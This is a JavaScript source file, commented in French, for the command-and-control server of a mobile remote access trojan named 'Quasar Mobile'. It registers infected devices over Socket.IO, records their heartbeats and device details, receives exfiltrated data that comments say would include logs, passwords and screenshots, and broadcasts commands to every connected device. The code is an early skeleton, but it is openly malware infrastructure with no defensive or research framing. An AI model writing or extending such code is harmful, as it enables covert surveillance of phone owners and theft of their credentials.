// server/index.js

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { v4: uuidv4 } = require('uuid'); // Pour générer des IDs uniques pour les appareils

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*", // Permettre les connexions de n'importe quelle origine (à restreindre en production)
        methods: ["GET", "POST"]
    }
});

const PORT = process.env.PORT || 3000; // Port pour le serveur C&C

// Stocker les informations des appareils connectés
const connectedDevices = {};

// Route simple pour vérifier si le serveur est en ligne
app.get('/', (req, res) => {
    res.send('Quasar Mobile C&C Server is running!');
});

// Gestion des connexions WebSocket
io.on('connection', (socket) => {
    console.log(`[+] Un nouvel appareil s'est connecté: ${socket.id}`);

    // Générer un ID unique pour cet appareil (pourrait être remplacé par un ID plus persistant plus tard)
    const deviceId = uuidv4();
    connectedDevices[socket.id] = {
        id: deviceId,
        socketId: socket.id,
        isConnected: true,
        lastSeen: new Date(),
        info: {} // Pour stocker les infos de l'appareil (modèle, version, etc.)
    };

    // Envoyer l'ID de l'appareil au client pour qu'il le connaisse
    socket.emit('assignedId', deviceId);

    // Écouter le heartbeat de l'appareil pour savoir qu'il est en ligne
    socket.on('heartbeat', (deviceInfo) => {
        connectedDevices[socket.id].lastSeen = new Date();
        connectedDevices[socket.id].isConnected = true;
        connectedDevices[socket.id].info = deviceInfo || {}; // Stocker les infos reçues
        console.log(`[Heartbeat] Appareil ${deviceId} (${socket.id}) est en ligne.`);
        // Ici, on pourrait envoyer une mise à jour au dashboard (via une autre connexion WebSocket ou une API)
    });

    // Écouter les messages/données envoyés par l'appareil
    socket.on('data', (data) => {
        console.log(`[DATA] Reçu de ${deviceId} (${socket.id}):`, data);
        // Ici, stocker les données dans la base de données MongoDB
        // Par exemple: enregistrer les logs, les mots de passe, les captures d'écran, etc.
    });

    // Gérer la déconnexion
    socket.on('disconnect', () => {
        console.log(`[-] L'appareil ${deviceId} (${socket.id}) s'est déconnecté.`);
        if (connectedDevices[socket.id]) {
            connectedDevices[socket.id].isConnected = false;
            // On pourrait le supprimer ou le marquer comme offline dans la DB
        }
        // Ici, on pourrait envoyer une mise à jour au dashboard
    });

    // Gérer les erreurs de socket
    socket.on('error', (err) => {
        console.error(`[ERROR] Erreur de socket pour ${deviceId} (${socket.id}):`, err);
        if (connectedDevices[socket.id]) {
            connectedDevices[socket.id].isConnected = false;
        }
    });
});

// Fonction pour envoyer une commande à tous les appareils connectés
function broadcastCommand(command, payload = {}) {
    console.log(`[BROADCAST] Envoi de la commande "${command}" à tous les appareils.`);
    io.emit('command', { command, payload });
}

// Exemple : Envoyer une commande "ping" à tous les appareils après 10 secondes
setTimeout(() => {
    broadcastCommand('ping');
}, 10000);

// Démarrer le serveur
server.listen(PORT, () => {
    console.log(`[*] Serveur C&C Quasar Mobile démarré sur le port ${PORT}`);
    console.log(`[*] En attente de connexions d'appareils RAT...`);
});

// Exporter les fonctions pour une utilisation potentielle dans d'autres modules (ex: API du dashboard)
module.exports = { server, io, connectedDevices, broadcastCommand };
